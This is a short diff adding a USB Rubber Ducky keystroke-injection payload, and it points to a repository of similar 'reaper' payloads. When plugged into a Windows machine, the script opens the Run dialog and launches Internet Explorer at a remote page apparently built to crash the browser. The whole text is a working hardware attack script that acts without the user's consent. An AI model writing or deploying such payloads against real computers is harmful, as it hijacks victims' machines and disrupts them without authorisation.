@@ -1,0 +1,8 @@
+REM the script have 3 version (2 for windows and 1 for mac os)
+REM all payloads here: https://github.com/JonnyBanana/DUCKY_REAPER
+DELAY 2000
+GUI R 
+DELAY 500
+STRING iexplore https://jonnybanana.github.io/safari-ie-reaper.github.io
+DELAY 500
+ENTER
